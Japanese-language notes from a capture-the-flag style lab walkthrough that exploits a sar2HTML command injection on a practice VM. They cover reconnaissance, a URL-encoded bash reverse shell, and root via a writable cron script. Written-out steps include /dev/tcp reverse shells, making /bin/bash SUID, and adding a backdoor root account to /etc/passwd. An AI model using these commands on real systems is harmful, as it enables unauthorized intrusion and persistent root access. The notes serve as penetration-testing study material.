### 論点
- exploitが説明書
- cron
### keyword
- openssl passwd,urlencode,pkexec


### 課題
- x86_64
- meterpreterでリバースシェルできる



## 攻略
- nmap
  - 80のみ 
- `gobuster dir -u $IP -x php,html -w $dirsmall`
  - これからは`-x`をつける。辞書が大きくないので、拡張子をつけてもたいして時間は変わらない 
  - phpinfo.php,robots.txt 
- phpinfo.php
  - サーバのいろんな情報がわかる。この中でも一番大事そうなのは一番上のSystem Linux 5.0.0-23 Ubuntu x86_64だとわかる
- robots.txt
  - /sar2HTMLという謎の文字があるが、これはディレクトリっぽいのでサイトを見てみる
- sar2htmlをネットで検索すると、どうもシステム情報を統計的に表示させるソフトらしい。exploitを検索する。
- msfonsoleだと何も出てこない。なぜかはわからん
- `searchsploit sar2HTML`
- `searchsploit -x 47204.txt` 
  - metasploitの実行ファイルでないのでcodeがなくosコマンンドインジェクションができる説明書
  - osコマンドインジェクションができるなら、まずやるのはreverse-shell
  - `-x`pagerとして読める
  - `-m`fileをダウンロードできる。mirrorと書いてあるが、コピーのこと
- reverse-shellをする
  - Parrotで待ち受ける`nc -nlvp 9001` 
  - 事前に~/tools/reverse-shell/にurlencodeしたreverse-shellは準備しておく、順にやっていく、ncはダメ。rmとbashはOK
  - `http://192.168.56.104/sar2HTML/index.php?plot=;bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F192.168.56.104%2F9001+%3C%261%27`
  - ブラウザのURLのリンクに貼り付ける。スペースがないように気をつける

- 完全な対話シェルにする
  - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
  - `export TERM=xterm`
  - ctrl + z
  - `stty raw -echo ; fg`
  - `stty rows 38 columns 115` 
- id
  - www-dataのみ 
  - www-dataなのでsudo -lは期待できない。パスワードが必要
- SUIDを探す
  - pkexecがある`version 0.105`
  - `PwnKit`ができる
- `ps aux | grep root`
  - だいたいいつものcronとapacheが動いている。cronの設定はcrontabに書いてあるので、crontabをチェックしてみる
- (補足) サイトのサーバ内での場所
  - phpinfo.phpで設定ファイルが見れる。その中にDocument_Rootがあって、そこに/var/www/htmlと書いてある。それで、そのDocument_Rootはどこで設定されているかというと、Server_rootに書いてある/var/www/ 
- `cat /etc/crontab`
  - 開けたファイルの一番下にfinally.shがルート権限で実行されているのがわかる。ちなみにcrontabに直接スクリプトが書いてあるのは珍しい、何も見れない時はpspyを使う 
  - `cat /var/www/html/finally.sh`
  - finally.shは書き込みができないので中の,write.shに書き込めるかチェックする
  - とりあえずファイルのところへ移動する。`cd /var/www/html`
  - finally.shの中にwrite.shがある。5分ごとに実行されているのがわかる。他にwrite.shには./write.shで実行されているので、`#!/bin/sh`のシバンが消えていたら実行されないので注意
  - `write.sh`は`ls -l`でパーミッションを見たら書き込みできる
- cronが、動いているのを確認する
  - `systemctl | grep cron` これがloaded active runningになっていたら動いている
  - または
  - これをするときは完全なシェルでないとctrl+cを押すと抜けるので注意
    - `journalctl -f` ここにrootで./finally.shが動いているのが確認できる。もし出てこなかったら何回か試してみる
- cronの書き込みでroot取得の方法は3つ。ここでは(3)が楽なので、これでする

- (1)reverse-shellでrootになる
  - write.shに次のを書き込む
  - `echo "bash -c 'exec bash -i &>/dev/tcp/192.168.56.104/9002 <&1'" >> write.sh`
  - `nc -nlvp 9002`でParrotで待ち受ける
- (2) bashをSUIDファイルにする
  - `echo 'chmod +s /bin/bash' >> write.sh`
  - `ls -l`でsになったら。次のコマンド
  - `/bin/bash -p`
- (3) バックドアを仕込む(ハッキングラボの7のevilboxのバックドアを仕込むに詳しく書いてある)
  - passwdファイルに自分のユーザ(root権限を持つ)を書き込んで、いつでも出入りできるようにする
  - ParrotOS側でパスワードを作成する
  - `openssl passwd -1 -salt usersalt`
  - 自分で適当にpasswordを入れる、ここでは`pass`としておく
  - `$1$usersalt$AdRPkkbvjFipmAjyOm.NT/`
  - オプションの`-1`はmd5でハッシュアルゴリズム、ちなみに`-5`はsha256、`-salt`はソルト
  - /etc/passwdはレコードごとにハッシュアルゴリズムが異なってもOK
  - (補足)ハッシュアルゴリズムの-1は必要だが、-saltはなくてもいい
  - パスワードをコピーしておく
  - ターゲット側のターミナルで作成する。/etc/passwdに書き込む
  - `>>`は追記なので注意 
  - `echo 'eviluser:ペースト:0:0:root:/root:/bin/bash' >> /etc/passwd`
  - フィールドの説明
  - `ユーザ名:x:ユーザ番号:グループ番号:名前:ホームディレクトリ:利用シェル`
